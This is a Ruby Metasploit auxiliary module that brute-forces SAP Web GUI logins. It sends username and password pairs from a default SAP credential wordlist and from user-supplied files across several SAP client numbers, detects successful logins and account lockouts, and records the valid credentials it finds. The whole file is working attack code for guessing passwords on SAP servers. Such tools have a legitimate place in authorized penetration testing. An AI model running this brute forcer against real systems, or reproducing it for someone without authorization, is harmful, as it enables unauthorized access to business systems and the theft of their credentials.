##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

##
# This module is based on, inspired by, or is a port of a plugin available in
# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy. I'd also like to thank Chris John Riley,
# Ian de Villiers and Joris van de Vis who have Beta tested the modules and
# provided excellent feedback. Some people just seem to enjoy hacking SAP :)
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::AuthBrute

  def initialize
    super(
      'Name' => 'SAP Web GUI Login Brute Forcer',
      'Description' => %q{
        This module attempts to brute force SAP username and passwords through the SAP Web
        GUI service. Default clients can be	tested without needing to set a CLIENT. Common
        and default user/password combinations can be tested just setting the DEFAULT_CRED
        variable to true. The MSF_DATA_DIRECTORY/wordlists/sap_default.txt path store
        stores these default combinations.
      },
      'References' =>
        [
          [ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]
        ],
      'Author' =>
        [
          'nmonkee'
        ],
      'License' => MSF_LICENSE

    )
    register_options(
      [
        Opt::RPORT(8000),
        OptString.new('TARGETURI', [true, 'URI', '/']),
        OptString.new('CLIENT', [false, 'Client can be single (066), comma separated list (000,001,066) or range (000-999)', '000,001,066']),
        OptBool.new('DEFAULT_CRED',[false, 'Check using the default password and username',true]),
        OptString.new('USERPASS_FILE',[false, '',nil])
      ])
  end

  def run_host(ip)
    uri = target_uri.to_s
    if datastore['CLIENT'].nil?
      print_status("Using default SAP client list")
      client = ['000','001','066']
    else
      client = []
      if datastore['CLIENT'] =~ /^\d{3},/
        client = datastore['CLIENT'].split(/,/)
        print_status("Brute forcing clients #{datastore['CLIENT']}")
      elsif datastore['CLIENT'] =~ /^\d{3}-\d{3}\z/
        array = datastore['CLIENT'].split(/-/)
        client = (array.at(0)..array.at(1)).to_a
        print_status("Brute forcing clients #{datastore['CLIENT']}")
      elsif datastore['CLIENT'] =~ /^\d{3}\z/
        client.push(datastore['CLIENT'])
        print_status("Brute forcing client #{datastore['CLIENT']}")
      else
        print_status("Invalid CLIENT - using default SAP client list instead")
        client = ['000','001','066']
      end
    end
    saptbl = Msf::Ui::Console::Table.new( Msf::Ui::Console::Table::Style::Default,
      'Header'  => "[SAP] Credentials",
      'Prefix'  => "\n",
      'Postfix' => "\n",
      'Indent'  => 1,
      'Columns' => ["host","port","client","user","pass"])


    if datastore['DEFAULT_CRED']
      credentials = extract_word_pair(Msf::Config.data_directory + '/wordlists/sap_default.txt')
      credentials.each do |u, p|
        client.each do |cli|
          success = bruteforce(uri, u, p, cli)
          if success
            saptbl << [ rhost, rport, cli, u, p]
          end
        end
      end
    end
    each_user_pass do |u, p|
      client.each do |cli|
        success = bruteforce(uri, u, p, cli)
        if success
          saptbl << [ rhost, rport, cli, u, p]
        end
      end
    end
    print(saptbl.to_s)

  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: Time.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def bruteforce(uri,user,pass,cli)
    begin
      path = "sap/bc/gui/sap/its/webgui/"
      cookie = "Active=true; sap-usercontext=sap-language=EN&sap-client=#{cli}"
      res = send_request_cgi({
        'uri'    => "#{uri}#{path}",
        'method' => 'POST',
        'cookie' => cookie,
        'vars_post' => {
          'sap-system-login-oninputprocessing' => 'onLogin',
          'sap-urlscheme' => '',
          'sap-system-login' => 'onLogin',
          'sap-system-login-basic_auth' => '',
          'sap-system-login-cookie_disabled' => '',
          'sysid' => '',
          'sap-client' => cli,
          'sap-user' => user,
          'sap-password' => pass,
          'sap-language' => 'EN'
          }
        })
    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
      print_error("[SAP] #{rhost}:#{rport} - Service failed to respond")
      return false
    end

    if res and res.code == 302
      report_cred(
        ip: rhost,
        port: rport,
        service_name: 'sap_webgui',
        user: user,
        password: pass,
        proof: "SAP Client: #{cli}"
      )
      return true
    elsif res and res.code == 200
      if res.body =~ /log on again/
        return false
      elsif res.body =~ /<title>Change Password - SAP Web Application Server<\/title>/
        report_cred(
          ip: rhost,
          port: rport,
          service_name: 'sap_webgui',
          user: user,
          password: pass,
          proof: "SAP Client: #{cli}"
        )
        return true
      elsif res.body =~ /Password logon no longer possible - too many failed attempts/
        print_error("[SAP] #{rhost}:#{rport} - #{user} locked in client #{cli}")
        return false
      end
    else
      print_error("[SAP] #{rhost}:#{rport} - error trying #{user}/#{pass} against client #{cli}")
      return false
    end
  end
end
